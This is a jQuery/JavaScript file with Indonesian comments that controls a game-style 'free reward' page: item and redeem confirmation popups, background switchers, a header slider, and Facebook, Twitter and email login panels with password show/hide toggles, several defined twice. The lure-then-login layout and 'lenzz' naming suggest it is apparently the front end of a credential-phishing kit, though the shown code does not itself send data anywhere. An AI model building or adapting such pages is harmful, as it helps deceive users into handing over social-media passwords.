// code for activate clicked sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

// code for showing hiding popup
function audioFiles() {
    var audio = document.getElementById('audioFiles');  
    audio.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "audioFiles()");  
});
// code for showing hiding popup
function open_find_id() {
    $('.find_id').show();
}
function close_find_id() {
    $('.find_id').hide();
}
function close_itemReward_confirmation() {
    $('.itemReward_confirmation').hide();
    $('.itemRedeem_confirmation').hide();
}
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    var rewardName = $(ag).attr("data-name");
    var amount = $(ag).attr("data-id");
    var price = $(ag).attr("value");
    $('.itemReward_confirmation').show();   
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
    $('#rewardName').html(rewardName);
    $('#amount').html(amount);
    $('#price').html(price);
}
function open_itemRedeem_confirmation(ag) {
  var itemRedeem_confirmationImg = $(ag).attr("src");
  var rewardNamex = $(ag).attr("data-namex");
  var pricex = $(ag).attr("valuex");
  $('.itemRedeem_confirmation').show();   
  $('#myItemRedeem_confirmationImg').attr('src',itemRedeem_confirmationImg);
  $('#rewardNamex').html(rewardNamex);
  $('#pricex').html(pricex);
}
function merah() {
    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/merah.jpg)";
}
function pink() {
    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/pink.jpg)";
}
function ungu() {
    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/ungu.jpg)";
}
function biru() {
    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/biru.jpg)";
}
function hijau() {
    document.getElementById('changebg').style.backgroundImage="url(img/bg_item/hijau.jpg)";
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
	var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
	$('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_once_confirmation() {
    $('.once_confirmation').show();
}
function open_many_confirmation() {
    $('.many_confirmation').show();
}
function open_once_rewards() {
    $('.once_rewards').show();
	$(".once_confirmation").hide()
}
function open_many_rewards() {
    $('.many_rewards').show();
	$(".many_confirmation").hide()
}
function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
}
function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
}
function close_rewards() {
    $(".once_confirmation").hide()
    $(".many_confirmation").hide()
	$(".once_rewards").hide()
    $(".many_rewards").hide()
}
function tutup_facebook() {
    $('.login-facebook').hide()
    $('.account_login').show();
}
function tutup_twitter() {
    $('.login-twitter').hide()
    $('.account_login').show();
}
function et() {
  $('.et').show();    
  $('.nt').hide();  
} 
function nt() {
  $('.nt').show();    
  $('.et').hide();    
}
function open_link() {
  $('.login-mail').show()
  $('.account_login').hide()
}
function close_link() {
  $('.login-mail').hide()
  $('.account_login').show()
}
// kode untuk ganti gambar header otomatis
var slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    var i;
    var slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2600);
}
function openloginlink(evt, loginlink) {
    var i, form_login, form_login_link;
    form_login = document.getElementsByClassName("form_login");
    for (i = 0; i < form_login.length; i++) {
        form_login[i].style.display = "none";        
    }
    form_login_link = document.getElementsByClassName("seclink-content");
    for (i = 0; i < form_login_link.length; i++) {
        form_login_link[i].className = form_login_link[i].className.replace(" seclink-content-active", "");
    }
    document.getElementById(loginlink).style.display = "block";
    evt.currentTarget.className += " seclink-content-active";
}
document.getElementById("email-login").click();

// show hide password for facebook
function showFbPassword() {
  var x = document.getElementById("selowpw-fb");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("selowpw-fb");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}
// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("selowpw-tw");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("selowpw-tw");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}
function showFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPassword() {
  var x = document.getElementById("password-facebook");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function showTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideTwitterPassword() {
  var x = document.getElementById("password-twitter");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}

function showFbPasswordS() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "password") {
    x.type = "text";
    $('.showPassword').hide();
    $('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function hideFbPasswordS() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "text") {
    x.type = "password";
    $('.showPassword').show();
    $('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}
function showTwitterPasswordS() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "password") {
      x.type = "text";
      $('.TwitterShowPassword').hide();
      $('.TwitterHidePassword').show();
  } else {
      x.type = "password";
  }
}
function hideTwitterPasswordS() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "text") {
      x.type = "password";
      $('.TwitterShowPassword').show();
      $('.TwitterHidePassword').hide();
  } else {
      x.type = "text";
  }
}

// show hide password for facebook
function SecshowFbPassword() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "password") {
    x.type = "text";
	$('.showPassword').hide();
	$('.hidePassword').show();
  } else {
    x.type = "password";
  }
}
function SechideFbPassword() {
  var x = document.getElementById("sec-password-facebook");
  if (x.type === "text") {
    x.type = "password";
	$('.showPassword').show();
	$('.hidePassword').hide();
  } else {
    x.type = "text";
  }
}

// show hide password for twitter
function SecshowTwitterPassword() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "password") {
    x.type = "text";
	$('.TwitterShowPassword').hide();
	$('.TwitterHidePassword').show();
  } else {
    x.type = "password";
  }
}
function SechideTwitterPassword() {
  var x = document.getElementById("sec-password-twitter");
  if (x.type === "text") {
    x.type = "password";
	$('.TwitterShowPassword').show();
	$('.TwitterHidePassword').hide();
  } else {
    x.type = "text";
  }
}

function open_purchase() {
  $('.sec-container-load').fadeIn(),
  setTimeout(function () {
    $('.sec-container-load').hide()
    $('.lenzz-purchase').show()
  }, 300),
  $('.lenzz-redeem').hide()
  $('.lenzz-shop').hide()
  $('.lenzz-event').hide()
}
function open_redeem() {
  $('.sec-container-load').fadeIn(),
  setTimeout(function () {
    $('.sec-container-load').hide()
    $('.lenzz-redeem').show()
  }, 300),
  $('.lenzz-event').hide()
  $('.lenzz-shop').hide()
  $('.lenzz-purchase').hide()
}
function open_shop() {
  $('.sec-container-load').fadeIn(),
  setTimeout(function () {
    $('.sec-container-load').hide()
    $('.lenzz-shop').show()
  }, 300),
  $('.lenzz-redeem').hide()
  $('.lenzz-event').hide()
  $('.lenzz-purchase').hide()
}
function open_event() {
  $('.sec-container-load').fadeIn(),
  setTimeout(function () {
    $('.sec-container-load').hide()
    $('.lenzz-event').show()
  }, 300),
  $('.lenzz-redeem').hide()
  $('.lenzz-shop').hide()
  $('.lenzz-purchase').hide()
}